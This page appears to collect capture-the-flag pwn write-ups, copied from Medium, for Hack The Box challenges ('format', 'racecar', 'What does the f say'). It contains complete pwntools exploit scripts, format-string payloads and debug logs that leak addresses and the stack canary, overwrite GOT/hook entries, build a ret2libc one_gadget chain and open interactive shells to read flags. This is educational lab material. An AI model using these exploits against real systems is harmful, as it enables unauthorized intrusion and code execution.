[*] '/root/hackthebox/challenge/pwn/format/libc-2.27.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to 188.166.173.208 on port 31941: Done
[DEBUG] Sent 0x6 bytes:
    '%37$p\n'
[DEBUG] Received 0xf bytes:
    '0x55ad927bd26d\n'
[+] LEAK => (init+117) address: 0x55ad927bd26d
[*] Base ELF address: 0x55ad927bc000
[*] printf@got.plt address: 0x55ad927bffc0
[DEBUG] Sent 0x11 bytes:
    00000000  41 41 41 41  25 37 24 73  c0 ff 7b 92  ad 55 00 00  │AAAA│%7$s│··{·│·U··│
    00000010  0a                                                  │·│
    00000011
[DEBUG] Received 0x10 bytes:
    00000000  41 41 41 41  80 4e 3f 41  5f 7f c0 ff  7b 92 ad 55  │AAAA│·N?A│_···│{··U│
    00000010
[+] Leaked __printf: 0x7f5f413f4e80
[DEBUG] Sent 0x79 bytes:
    00000000  25 33 34 63  25 31 35 24  6c 6c 6e 25  32 37 63 25  │%34c│%15$│lln%│27c%│
    00000010  31 36 24 68  68 6e 25 34  63 25 31 37  24 68 68 6e  │16$h│hn%4│c%17│$hhn│
    00000020  25 33 30 63  25 31 38 24  68 68 6e 25  33 32 63 25  │%30c│%18$│hhn%│32c%│
    00000030  31 39 24 68  68 6e 25 31  31 36 63 25  32 30 24 68  │19$h│hn%1│16c%│20$h│
    00000040  68 6e 61 61  61 61 62 61  30 bc 77 41  5f 7f 00 00  │hnaa│aaba│0·wA│_···│
    00000050  32 bc 77 41  5f 7f 00 00  33 bc 77 41  5f 7f 00 00  │2·wA│_···│3·wA│_···│
    00000060  34 bc 77 41  5f 7f 00 00  35 bc 77 41  5f 7f 00 00  │4·wA│_···│5·wA│_···│
    00000070  31 bc 77 41  5f 7f 00 00  0a                        │1·wA│_···│·│
    00000079
[DEBUG] Received 0xff bytes:
    00000000  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
    *
    00000020  20 b0 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │ ·  │    │    │    │
    00000030  20 20 20 20  20 20 20 20  20 20 20 20  d0 20 20 20  │    │    │    │·   │
    00000040  81 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │·   │    │    │    │
    00000050  20 20 20 20  20 20 20 20  20 20 20 20  20 20 c0 20  │    │    │    │  · │
    00000060  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
    00000070  20 20 20 20  20 20 20 20  20 20 20 20  20 20 c0 20  │    │    │    │  · │
    00000080  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
    *
    000000f0  20 20 25 61  61 61 61 62  61 30 bc 77  41 5f 7f     │  %a│aaab│a0·w│A_·│
    000000ff
[DEBUG] Sent 0x9 bytes:
    '%100000c\n'
[*] Switching to interactive mode
$ id
[DEBUG] Sent 0x3 bytes:
    'id\n'
[DEBUG] Received 0x2a bytes:
    'uid=999(ctf) gid=999(ctf) groups=999(ctf)\n'
uid=999(ctf) gid=999(ctf) groups=999(ctf)
$ whoami
[DEBUG] Sent 0x7 bytes:
    'whoami\n'
[DEBUG] Received 0x4 bytes:
    'ctf\n'
ctf
$ ls
[DEBUG] Sent 0x3 bytes:
    'ls\n'
[DEBUG] Received 0x21 bytes:
    'flag.txt\n'
    'format\n'
    'run_challenge.sh\n'
flag.txt
format
run_challenge.sh
$ cat flag.txt
[DEBUG] Sent 0xd bytes:
    'cat flag.txt\n'
[DEBUG] Received 0x1e bytes:
    'HTB{mall0c_h00k_f0r_th3_w1n!}\n'
HTB{mall0c_h00k_f0r_th3_w1n!}
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/format31.jpg)

<!-- kb:end format -->

</details>

<a id="case-racecar"></a>

## 栈数据与小端重组

格式化字符串读取指针后，需要按目标字长和小端顺序重组文件内容。原文保留调试偏移和完整远程脚本。

<p class="kb-provenance">来源 racecar · 原记录 2021-09-01 · 6 个代码块 · 7 处图片引用</p>

<details class="kb-evidence" id="record-racecar">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start racecar -->

#### 详细过程及exp
#### 1. Basic checks:

``` bash
┌──(root💀kali)-[~/hackthebox/challenge/pwn/racecar]
└─# file racecar 
racecar: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=35ad6e9ae5099d45b4bdcce9da94305bb9dbeb87, not stripped
┌──(root💀kali)-[~/hackthebox/challenge/pwn/racecar]
└─# checksec racecar
[*] '/root/hackthebox/challenge/pwn/racecar/racecar'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```



#### 2. Spot the vulnerability — format string:

Format string vulnerability lies in the printf() after "winning the race".

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/racecar.jpg)

 - Create flag.txt in the directory with the binary (echo AAAA > flag.txt )

 - Run the racecar and set up correct variables to get to the end of the race.

``` bash
from pwn import *

p = process("./racecar")

def go_to_end():
    p.sendline("Name")
    p.recv()
    p.sendline("Nickname")
    p.recv()
    p.sendline("2")
    p.recv()
    p.sendline("1")
    p.recv()
    p.sendline("2")
    p.recv()

go_to_end()
p.sendline("%p")
```

 - Input %p to leak pointer address.

#### 3. General overview of what is being leaked:

 - Run the binary in GDB and set a breakpoint at the vulnerable printf() .

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/racecar1.jpg)

 - Input 40x %p to leak more data.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/racecar2.jpg)

At the 12th position, there is a beginning of flag.txt — “AAAA” string which was input before.
It seems like the flag is stored on the stack.

#### Leak the flag from the remote service:

Use [direct parameter access input format string](https://kevinalmansa.github.io/application%20security/Format-Strings/) %12$x to leak flag.txt from a remote system.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/racecar3.jpg)

Check if this is the beginnings of the flag.txt

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/racecar4.jpg)

#### 5. Reverse the flag:

Leak more data, then reverse bytes starting from 0x7b ({ ) to 0x7d (} ).

``` bash
p.sendline(“%x%x%x%x%x%x%x%x%x%x%x — -FLAG: %p%p%p%p%p%p%p%p%p%p%p — -”)
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/racecar5.jpg)

Pack leaked data as a byte string (little-endian 4B size).

 - de.py

``` python
from pwn import *

flag = "0x7b4254480x5f7968770x5f6431640x34735f310x745f33760x665f33680x5f67346c0x745f6e300x355f33680x6b6334740x7d213f"
decoded_flag = []

for element in flag.split("0x")[1:]:
	decoded_flag.append(p32(int("0x" + element,16)))

print ''.join(decoded_flag)
```

#### 6. Final exploit:

``` python
from pwn import *
import time

p = remote("46.101.23.188",31954)
#p = process("./racecar")
context.log_level = "debug"

def go_to_end():
    p.sendline("Name")
    p.recv()
    p.sendline("Nickname")
    p.recv()
    p.sendline("2")
    p.recv()
    p.sendline("1")
    p.recv()
    p.sendline("2")
    p.recv()

go_to_end()
p.sendline("%x%x%x%x%x%x%x%x%x%x%x---FLAG: %p%p%p%p%p%p%p%p%p%p%p ---")
print(p.recv())

p.interactive()
```

``` bash
┌──(root💀kali)-[~/hackthebox/challenge/pwn/racecar]
└─# python de.py                                                                                                              
HTB{why_d1d_1_s4v3_th3_fl4g_0n_th3_5t4ck?!}\x00
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/racecar6.jpg)

#### 摘自(致敬原作)......

 - 浏览medium.com博客每月有次数限制，并且5$收费，故摘录文章。。。
 - [PWN Racecar challenge - HTB](https://karol-mazurek95.medium.com/pwn-racecar-challenge-htb-80aad2b930be)
<!-- kb:end racecar -->

</details>

<a id="case-what-dose-the-f-say"></a>

## PIE、Canary 与 libc 的分层泄漏

格式化读取与缓冲区溢出组合使用，分别恢复模块基址、canary 与 libc。原脚本保留每次连接的地址计算和保护绕过。

<p class="kb-provenance">来源 what-dose-the-f-say · 原记录 2021-09-09 · 6 个代码块 · 24 处图片引用</p>

<details class="kb-evidence" id="record-what-dose-the-f-say">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start what-dose-the-f-say -->

#### 详细过程及exp
#### 1. Basic checks:

``` bash
┌──(root💀kali)-[~/hackthebox/challenge/pwn/What_does_the_f_say_]
└─# file what_does_the_f_say 
what_does_the_f_say: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=dd622e290e6b1ac53e66369b85805ccd8a593fd0, for GNU/Linux 3.2.0, not stripped
┌──(root💀kali)-[~/hackthebox/challenge/pwn/What_does_the_f_say_]
└─# checksec what_does_the_f_say
[*] '/root/hackthebox/challenge/pwn/What_does_the_f_say_/what_does_the_f_say'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```



#### 2. General overview:

There are two options to choose from at the beginning.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/wtf-say.jpg)

Users can choose between drinks and food, then other options pop up, because of either drinks_menu() or food_menu() .

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/wtf-say1.jpg)

If the user selects drinks_menu() three additional options will appear, in one of them (2) there is a possibility to choose between red or green Kryptonite and the string is being reflected by the program.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/wtf-say2.jpg)

#### 3. Spot the first vulnerability — Format string:

The vulnerability lies in the printf() when you chose Kryptonite vodka.
(printf() should look like: printf("%s\n", argv[1]); )

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/wtf-say3.jpg)

Set a breakpoint @ drinks_menu+239 in gdb.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/wtf-say4.jpg)

Run the binary and input format string (1) while choosing the type of Kryptonite, then go to the next instruction (2) and observe the leaked address (3).

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/wtf-say5.jpg)

Leaked address (3) 0x555555555860 is a __libc_csu_init and could be used to calculate the base address of binary, thus defeat the PIE security, but on the remote binary, this address was patched with 0x2f2f2f2f2f2f2f2 to prevent the [return_to_csu](https://i.blackhat.com/briefings/asia/2018/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf) attack scenario.

Since there is no possibility to leak more data at once than 9 pointers, use direct formatting and some automation to leak the first 40 addresses from the stack.

 - leak.py

``` python
import sys
from pwn import *

context.log_level = 'error'
for i in range(int(sys.argv[2]), int(sys.argv[3])):
    p = process(sys.argv[1])
    p.sendline("1")
    p.recv()
    p.sendline("2")
    p.recv()
    p.sendline('%{}$p '.format(i))
    print "{:2}: {}".format(i, p.recvline().split(' ')[0])
    p.close()
```

``` bash
┌──(root💀kali)-[~/hackthebox/challenge/pwn/What_does_the_f_say_]
└─# python leak.py what_does_the_f_say 1 40
 1: 0x7fff80ebad80
 2: 0x1d
 3: 0x7fb68b114e8e
 4: 0x1a
 5: (nil)
 6: (nil)
 7: 0x240c685d0
 8: 0xa2070243825
 9: (nil)
10: (nil)
11: (nil)
12: (nil)
13: 0x194d94d52dd1400
14: 0x7ffc41521210
15: 0x55cd3406874a
16: 0x1c5d50897
17: 0xd1f170bf78a46400
18: 0x7fff118dd9b0
19: 0x55613336e841
20: 0x7ffd88b315e8
21: 0x110d660d0
22: 0x7ffe86135770
23: 0xb4fe640441ff800
24: 0x563b73e11860
25: 0x7fdcf0c10d0a
26: 0x7ffe2e130348
27: 0x100000000
28: 0x55b56001180a
29: 0x7f1d5af007cf
30: (nil)
31: 0x958cb4560afd0ffb
32: 0x55b415ad30d0
33: (nil)
34: (nil)
35: (nil)
36: 0xd33063c0fab1e44d
37: 0x7f81b4ce8f1e2551
38: (nil)
39: (nil)
```

15th pointer from the stack is the same locally as on the remote binary and points to: 0x55cd3406874a <fox_bar+106> it will be used to calculate the base address of binary.

#### 4. PIE bypass - calculate ELF base:

This step could be omitted but I left it because maybe someone will find it useful.

 - Leak <fox_bar+106> .
 - Using relative addressing calculate the ELF base address.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/wtf-say6.jpg)

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/wtf-say7.jpg)

sleep(0.5) between the sending / receiving the data needs to be implemented because the exploit will calculate the addresses before it receives the data from the socket.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/wtf-say8.jpg)

#### 5. Spot the second vulnerability - Buffer overflow:

Another vulnerability lies in the warning() which is being called after choosing Kryptonite vodka.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/wtf-say9.jpg)

If (1) the user has less than 20 stones, (2) he is asked if he really wants to buy Kryptonite vodka.

Users can enter more than 24B (3), thus overflowing the stack.

At the end of the function, there is a Stack Canary check (4).

#### 6. Stack Canary bypass - leak the canary:

A terminator canary contains NULL(0x00), CR (0x0d), LF (0x0a), and EOF (0xff), four characters that should terminate most string operations, rendering the overflow attempt harmless

 - If you look closely at the leaked addresses, you will notice few ending on \x00 bytes which might indicate a terminator.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/wtf-say10.jpg)

19th pointer is the main+55 instruction which is close to stack_chk_fail (terminate a function in case of stack overflow) so the 23rd pointer is the Stack canary.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/wtf-say11.jpg)

Leak the Stack Canary.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/wtf-say12.jpg)

To successfully bypass the Stack Canary security control during overflow, you got to first leak this canary as shown above and then spent rocks until you got less than 20 to trigger the warning() .

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/wtf-say13.jpg)

Then attach the GDB and set the breakpoint @warning + 274

Enter random 24 bytes, then stack canary and use cyclic() to overflow the return address to confirm the control over the execution flow.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/wtf-say14.jpg)

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/wtf-say15.jpg)

The first 8 bytes after the terminator will be stored in the RBP register and then all bytes after are stored in RSP.

The next instruction will return to the value in RSP so ROP chain will start at 9B of input after the terminator.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/wtf-say16.jpg)

#### 7. Leak the libc version from the remote system:

In order to conduct the ret2libc attack, you have to leak the libc base address first.

25th pointer 0x7ffff7ddd0b3 leaked via format string vulnerability points to __libc_start_main .

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/wtf-say17.jpg)

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/wtf-say18.jpg)

It can be used to calculate the base address of libc and the ROP chain.

First leak this address from the remote target.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/wtf-say19.jpg)

Running exploit twice shows that there is ASLR being used.

Use [https://libc.blukat.me/](https://libc.blukat.me/) with the leaked address to check the libc version being used on the remote system.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/wtf-say20.jpg)

Download the libc and search for one_gadget within it.

 - [https://libc.blukat.me/?q=__libc_start_main_ret:0x7fe097c4fb97&l=libc6_2.27-3ubuntu1.2_amd64](https://libc.blukat.me/?q=__libc_start_main_ret:0x7fe097c4fb97&l=libc6_2.27-3ubuntu1.2_amd64)

``` bash
┌──(root💀kali)-[~/hackthebox/challenge/pwn/What_does_the_f_say_]
└─# one_gadget libc6_2.27-3ubuntu1.2_amd64.so 
0x4f365 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f3c2 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a45c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

#### 8. ASLR bypass - calculate addresses during runtime:

First, calculate the base libc address, then add it to the one_gadget.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/wtf-say21.jpg)

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/wtf-say22.jpg)

#### 9. Final exploit:

 - getshell.py

``` python
import sys
from pwn import *
from time import sleep

context.log_level = 'info'
#p = process("./what_does_the_f_say")

p = remote("46.101.23.188", 31191)
elf = ELF("what_does_the_f_say")
libc = ELF("./libc6_2.27-3ubuntu1.2_amd64.so")

def go_to_krypto():
	p.sendline("1")
	sleep(0.5)
	p.recv()
	p.sendline("2")
	sleep(0.5)
	p.recv()

# PIE - Calculating base address of the binary ---
def calculate_elf_basse():
	go_to_krypto()
	p.sendline("%15$p")
	sleep(0.5)
	leak_fox_bar = int(p.recv().split("\n\n")[0].rstrip(),16)
	log.success("Leaked fox_bar+106:  \t0x{0:x}".format(leak_fox_bar))
	base_elf = leak_fox_bar - 0x174a
	log.success("ELF base address:\t\t0x{0:x}".format(base_elf))
	elf.address = base_elf # updating ELF


# SC - Leaking the canary ---
def leak_the_canary():
	go_to_krypto()
	p.sendline("%23$p")
	sleep(0.5)
	leak_stack_canary = int(p.recv().split("\n\n")[0].rstrip(),16)
	log.success("Leaked Stack Canary: \t0x{0:x}".format(leak_stack_canary))
	return leak_stack_canary

# Trigger warning function ---
def go_to_warning():
	# Current space rocks: 55.89
	for i in range(0,5):
		p.sendline("2")
		sleep(0.5)
		p.recv()
		p.sendline("3")
		sleep(0.5)
		p.recv()

# BO - jump over canary & control the execuction flow ---
def overflow_warning(stack_canary, rop_chain):
	go_to_krypto()
	p.sendline("RED")
	sleep(0.5)
	p.recv()
	p.sendline("A"*24 + p64(stack_canary) + "A" * 8  + p64(rop_chain))

# Leak libc address ---
def leak_libc():
	go_to_krypto()
	p.sendline("%25$p")
	sleep(0.5)
	leak_libc = int(p.recv().split("\n\n")[0].rstrip(),16)
	log.success("Leaked libc address: \t0x{0:x}".format(leak_libc))
	return leak_libc

# ASLR - calculating base of libc and one_gadget ---
def calculate_rop_chain(leak_libc):
	base_libc = leak_libc - 0x021b97
	log.success("Base libc address:   \t0x{0:x}".format(base_libc))
	rop_chain = base_libc + 0x4f365
	log.success("One_gadget address:  \t0x{0:x}".format(rop_chain))
	return rop_chain

calculate_elf_basse()
leak_libc = leak_libc()
rop_chain = calculate_rop_chain(leak_libc)
stack_canary = leak_the_canary()
go_to_warning()
overflow_warning(stack_canary, rop_chain)

p.interactive()
```

``` bash
┌──(root💀kali)-[~/hackthebox/challenge/pwn/What_does_the_f_say_]
└─# python getshell.py                                                                                                               
[+] Opening connection to 46.101.23.188 on port 31191: Done
[*] '/root/hackthebox/challenge/pwn/What_does_the_f_say_/what_does_the_f_say'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/root/hackthebox/challenge/pwn/What_does_the_f_say_/libc6_2.27-3ubuntu1.2_amd64.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Leaked fox_bar+106:      0x55a62406174a
[+] ELF base address:        0x55a624060000
[+] Leaked libc address:     0x7fa734f09b97
[+] Base libc address:       0x7fa734ee8000
[+] One_gadget address:      0x7fa734f37365
[+] Leaked Stack Canary:     0x1a2e9dc3778edc00
[*] Switching to interactive mode
$ id
uid=999(ctf) gid=999(ctf) groups=999(ctf)
$ whoami
ctf
$ ls
flag.txt
run_challenge.sh
what_does_the_f_say
$ cat flag.txt
HTB{th3_f_s4ys_f0rm4t_str1ng!!}
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/wtf-say23.jpg)

#### 摘自(致敬原作)......

 - 浏览medium.com博客每月有次数限制，并且5$收费，故摘录文章。。。
 - [PWN What does the f say? - HTB](https://karol-mazurek95.medium.com/pwn-what-does-the-f-say-htb-5df7a99e43ea)
<!-- kb:end what-dose-the-f-say -->

</details>

